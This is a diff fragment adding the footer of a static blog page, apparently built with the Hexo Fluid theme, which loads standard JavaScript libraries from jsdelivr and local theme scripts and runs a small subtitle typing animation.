+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
